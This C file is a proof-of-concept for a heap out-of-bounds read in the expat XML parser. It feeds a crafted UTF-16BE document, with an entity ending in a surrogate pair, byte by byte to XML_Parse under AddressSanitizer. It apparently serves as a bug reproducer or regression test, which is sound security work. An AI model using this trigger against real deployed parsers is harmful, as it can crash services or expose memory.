/* PoC: UTF-16BE document whose internal entity replacement text ends with a
 * supplementary code point, fed to XML_Parse one byte at a time.  On the
 * vulnerable library the trailing 16-bit code unit is dropped while storing
 * the entity value, leaving a lone high surrogate; the attribute tokenizer
 * then steps past the end of the stored text and the conversion that copies
 * the entity into the attribute pool reads out of bounds (heap-buffer-
 * overflow under AddressSanitizer).
 *
 * Build against an expat library compiled with 16-bit XML_Char
 * (-DEXPAT_CHAR_TYPE=ushort, i.e. XML_UNICODE) and -fsanitize=address.
 */
#include <stdio.h>
#include <string.h>
#include <expat.h>

/* Feed one byte at a time, like the expat test suite does. */
static int
feed(XML_Parser parser, const char *buf, int len, int isFinal) {
  int i;
  for (i = 0; i < len; i++) {
    if (XML_Parse(parser, buf + i, 1, XML_FALSE) == XML_STATUS_ERROR) {
      fprintf(stderr, "parse error at byte %d: %s\n", i,
              XML_ErrorString(XML_GetErrorCode(parser)));
      return 0;
    }
  }
  if (isFinal
      && XML_Parse(parser, "", 0, XML_TRUE) == XML_STATUS_ERROR) {
    fprintf(stderr, "parse error at final: %s\n",
            XML_ErrorString(XML_GetErrorCode(parser)));
    return 0;
  }
  return 1;
}

int
main(void) {
  /* <!DOCTYPE d [  <!ENTITY e '...'> ]> <r a='&e;'/> in UTF-16BE */
  static const char doc_before[]
      = "\0<\0!\0D\0O\0C\0T\0Y\0P\0E\0 \0d\0 \0[\0\n"
        "\0 \0 \0<\0!\0E\0N\0T\0I\0T\0Y\0 \0e\0 \0'";
  static const char doc_after[]
      = "\0'\0>\0\n\0]\0>\0\n"
        "\0<\0r\0 \0a\0=\0'\0&\0e\0;\0'\0/\0>\0\n";
  /* U+1F6D8 = high surrogate 0xD83D + low surrogate 0xDED8, UTF-16BE */
  static const char pair[] = "\xd8\x3d\xde\xd8";
  int i, j;

  for (i = 1021; i <= 1025; i++) {
    XML_Parser parser = XML_ParserCreate(NULL);
    if (! parser)
      return 2;
    if (! feed(parser, doc_before, (int)sizeof(doc_before) - 1, 0))
      return 1;
    for (j = 0; j < i; j++) {
      if (! feed(parser, "\0" "a", 2, 0))
        return 1;
    }
    if (! feed(parser, pair, 4, 0))
      return 1;
    if (! feed(parser, doc_after, (int)sizeof(doc_after) - 1, 1))
      return 1;
    XML_ParserFree(parser);
  }
  fprintf(stderr, "all ok\n");
  return 0;
}
